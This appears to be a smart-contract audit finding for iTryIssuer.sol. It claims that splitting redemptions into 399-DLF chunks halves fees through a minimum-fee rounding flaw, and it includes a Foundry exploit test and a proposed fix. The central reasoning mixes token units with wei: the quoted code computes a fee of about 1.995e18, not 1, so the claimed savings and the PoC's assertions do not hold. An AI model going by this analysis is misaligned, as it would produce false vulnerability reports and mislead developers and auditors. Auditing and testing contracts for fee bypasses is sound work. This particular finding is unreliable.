## Title
Redemption Fee Bypass Through Transaction Splitting Exploits Rounding Mechanism

## Summary
The `_calculateRedemptionFee` function in iTryIssuer.sol returns a minimum fee of 1 when the calculated fee rounds down to zero. An attacker can exploit this by splitting large redemptions into many small transactions, each paying only 1 unit of fee instead of the proper percentage-based fee, resulting in up to ~50% reduction in total fees paid.

## Impact
**Severity**: Medium

## Finding Description

**Location:** `src/protocol/iTryIssuer.sol`, function `_calculateRedemptionFee` (lines 686-694) and `redeemFor` (lines 318-370) [1](#0-0) 

**Intended Logic:** The redemption fee calculation is designed to charge a percentage-based fee (configured in `redemptionFeeInBPS`) on the gross DLF amount being redeemed. The `feeAmount == 0 ? 1 : feeAmount` logic at line 693 is intended to ensure the protocol collects at least a minimal fee even on very small redemptions.

**Actual Logic:** When an attacker redeems amounts where `grossDlfAmount * redemptionFeeInBPS / 10000` rounds down to zero, the fee is set to 1. However, for amounts just below the next integer threshold, the attacker pays significantly less than the intended percentage. This creates an exploitable rounding advantage when splitting large redemptions.

**Exploitation Path:**

1. **Attacker identifies optimal split amount**: For a redemption fee of 50 BPS (0.5%), amounts where `199 < grossDlfAmount < 400` result in a fee of 1 DLF (since `399 * 50 / 10000 = 1.995` rounds to 1).

2. **Attacker splits large redemption**: Instead of redeeming 1,000,000 iTRY in one transaction (which would incur ~5,000 DLF in fees), the attacker splits it into ~2,506 transactions of amounts corresponding to 399 DLF each. [2](#0-1) 

3. **Each transaction pays minimal fee**: Each redemption pays only 1 DLF fee instead of the proper 1.995 DLF, saving ~0.995 DLF per transaction.

4. **Total fee savings**: The attacker pays ~2,507 DLF in total fees instead of ~5,000 DLF, achieving approximately 50% fee reduction.

**Security Property Broken:** This violates the intended economic model where redemption fees should be proportional to the redeemed amount. The protocol treasury receives significantly less revenue than designed, undermining the fee mechanism's purpose.

## Impact Explanation

- **Affected Assets**: Protocol treasury receives reduced DLF fees; attacker extracts more DLF value than intended.

- **Damage Severity**: For large redemptions with 0.5% fee:
  - 1M DLF redemption: ~2,500 DLF fee loss (~50% reduction)
  - 10M DLF redemption: ~25,000 DLF fee loss (~50% reduction)
  - The percentage loss scales with redemption size and can be repeated indefinitely.

- **User Impact**: All protocol stakeholders are affected as treasury underfunding may impact protocol sustainability, yield distribution, and operational capabilities.

## Likelihood Explanation

- **Attacker Profile**: Any whitelisted user with iTRY holdings can exploit this. No special privileges required beyond normal redemption access.

- **Preconditions**: 
  - Protocol must have redemption fee configured (redemptionFeeInBPS > 0)
  - Attacker must hold sufficient iTRY to make splitting economically viable (gas costs vs. savings)
  - FastAccessVault or custodian must have sufficient DLF liquidity

- **Execution Complexity**: Low - attacker simply calls `redeemFor` multiple times with calculated amounts. Can be automated in a single contract or script.

- **Frequency**: Can be exploited continuously by any user, on every redemption, with no cooldown or rate limiting.

## Recommendation

Replace the fixed minimum fee of 1 with a proper minimum threshold check and revert if the redemption amount is too small to charge the intended fee:

```solidity
// In src/protocol/iTryIssuer.sol, function _calculateRedemptionFee, lines 686-694:

// CURRENT (vulnerable):
function _calculateRedemptionFee(uint256 amount) internal view returns (uint256) {
    if (redemptionFeeInBPS == 0) {
        return 0;
    }
    uint256 feeAmount = amount * redemptionFeeInBPS / 10000;
    return feeAmount == 0 ? 1 : feeAmount; // avoid round-down to zero
}

// FIXED:
function _calculateRedemptionFee(uint256 amount) internal view returns (uint256) {
    if (redemptionFeeInBPS == 0) {
        return 0;
    }
    uint256 feeAmount = amount * redemptionFeeInBPS / 10000;
    // Revert if amount too small to charge proper fee
    if (feeAmount == 0) {
        revert AmountTooSmallForFee(amount, redemptionFeeInBPS);
    }
    return feeAmount;
}
```

Alternative mitigations:
1. Implement a minimum redemption amount that ensures fees are always above the rounding threshold
2. Add a per-user redemption rate limit (e.g., max N redemptions per day)
3. Charge a higher fixed minimum fee (e.g., 100 units) to make splitting uneconomical

## Proof of Concept

```solidity
// File: test/Exploit_RedemptionFeeSplitting.t.sol
// Run with: forge test --match-test test_RedemptionFeeSplitting -vvv

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/protocol/iTryIssuer.sol";
import "./iTryIssuer.base.t.sol";

contract Exploit_RedemptionFeeSplitting is iTryIssuerBaseTest {
    
    function test_RedemptionFeeSplitting() public {
        // SETUP: Configure redemption fee to 50 BPS (0.5%)
        vm.prank(admin);
        issuer.setRedemptionFeeInBPS(50);
        
        // Mint large amount of iTRY to attacker
        uint256 totalItryAmount = 1_000_000 * 1e18;
        _setupMintScenario(alice, totalItryAmount);
        
        uint256 navPrice = oracle.price();
        uint256 totalGrossDlf = totalItryAmount * 1e18 / navPrice; // 1M DLF at 1:1
        
        // SCENARIO 1: Normal single redemption
        uint256 normalFee = totalGrossDlf * 50 / 10000; // 5,000 DLF
        uint256 normalNet = totalGrossDlf - normalFee;  // 995,000 DLF
        
        console.log("Normal redemption:");
        console.log("  Gross DLF:", totalGrossDlf);
        console.log("  Fee:", normalFee);
        console.log("  Net received:", normalNet);
        
        // SCENARIO 2: Split redemption attack
        // Each chunk: 399 DLF worth of iTRY
        // Fee per chunk: 399 * 50 / 10000 = 1.995 -> rounds to 1
        uint256 optimalGrossDlf = 399 * 1e18;
        uint256 iTryPerChunk = optimalGrossDlf * navPrice / 1e18;
        uint256 numChunks = totalItryAmount / iTryPerChunk; // ~2506 chunks
        
        uint256 totalFeePaid = 0;
        uint256 totalNetReceived = 0;
        
        vm.startPrank(alice);
        for (uint256 i = 0; i < numChunks; i++) {
            uint256 netDlf = issuer.previewRedeem(iTryPerChunk);
            issuer.redeemITRY(iTryPerChunk, 0);
            totalFeePaid += (optimalGrossDlf - netDlf);
            totalNetReceived += netDlf;
        }
        vm.stopPrank();
        
        console.log("\nSplit redemption attack:");
        console.log("  Number of chunks:", numChunks);
        console.log("  Total fee paid:", totalFeePaid);
        console.log("  Total net received:", totalNetReceived);
        console.log("  Fee savings:", normalFee - totalFeePaid);
        console.log("  Savings percentage:", (normalFee - totalFeePaid) * 100 / normalFee, "%");
        
        // VERIFY: Attacker paid significantly less fees
        assertLt(totalFeePaid, normalFee, "Split redemption paid less fees");
        assertGt(normalFee - totalFeePaid, normalFee * 40 / 100, "Fee savings > 40%");
    }
}
```

## Notes

This vulnerability is distinct from gas-inefficiency concerns. While splitting transactions incurs higher gas costs, the fee savings can far exceed gas costs for large redemptions, especially on L2s or during low gas periods. The attack becomes more profitable as:

1. The redemption amount increases (more absolute savings)
2. Gas costs decrease (L2 deployment, low network congestion)
3. The DLF token value increases (higher value of saved fees)

The same logic flaw exists in `_calculateMintFee` (lines 670-678), creating a similar attack vector for minting operations where users can split mints to reduce fee payments. [3](#0-2)

### Citations

**File:** src/protocol/iTryIssuer.sol (L318-370)
```text
    function redeemFor(address recipient, uint256 iTRYAmount, uint256 minAmountOut)
        public
        onlyRole(_WHITELISTED_USER_ROLE)
        nonReentrant
        returns (bool fromBuffer)
    {
        // Validate recipient address
        if (recipient == address(0)) revert CommonErrors.ZeroAddress();

        // Validate iTRYAmount > 0
        if (iTRYAmount == 0) revert CommonErrors.ZeroAmount();

        if (iTRYAmount > _totalIssuedITry) {
            revert AmountExceedsITryIssuance(iTRYAmount, _totalIssuedITry);
        }

        // Get NAV price from oracle
        uint256 navPrice = oracle.price();
        if (navPrice == 0) revert InvalidNAVPrice(navPrice);

        // Calculate gross DLF amount: iTRYAmount * 1e18 / navPrice
        uint256 grossDlfAmount = iTRYAmount * 1e18 / navPrice;

        if (grossDlfAmount == 0) revert CommonErrors.ZeroAmount();

        uint256 feeAmount = _calculateRedemptionFee(grossDlfAmount);
        uint256 netDlfAmount = grossDlfAmount - feeAmount;

        // Check if output meets minimum requirement
        if (netDlfAmount < minAmountOut) {
            revert OutputBelowMinimum(netDlfAmount, minAmountOut);
        }

        _burn(msg.sender, iTRYAmount);

        // Check if buffer pool has enough DLF balance
        uint256 bufferBalance = liquidityVault.getAvailableBalance();

        if (bufferBalance >= grossDlfAmount) {
            // Buffer has enough - serve from buffer
            _redeemFromVault(recipient, netDlfAmount, feeAmount);

            fromBuffer = true;
        } else {
            // Buffer insufficient - serve from custodian
            _redeemFromCustodian(recipient, netDlfAmount, feeAmount);

            fromBuffer = false;
        }

        // Emit redemption event
        emit ITRYRedeemed(recipient, iTRYAmount, netDlfAmount, fromBuffer, redemptionFeeInBPS);
    }
```

**File:** src/protocol/iTryIssuer.sol (L670-678)
```text
    function _calculateMintFee(uint256 amount) internal view returns (uint256 feeAmount) {
        // Account for mint fee if configured
        if (mintFeeInBPS > 0) {
            feeAmount = amount * mintFeeInBPS / 10000;
            return feeAmount == 0 ? 1 : feeAmount; // avoid round-down to zero
        } else {
            return 0;
        }
    }
```

**File:** src/protocol/iTryIssuer.sol (L686-694)
```text
    function _calculateRedemptionFee(uint256 amount) internal view returns (uint256) {
        // Account for redemption fee if configured
        if (redemptionFeeInBPS == 0) {
            return 0;
        }

        uint256 feeAmount = amount * redemptionFeeInBPS / 10000;
        return feeAmount == 0 ? 1 : feeAmount; // avoid round-down to zero
    }
```
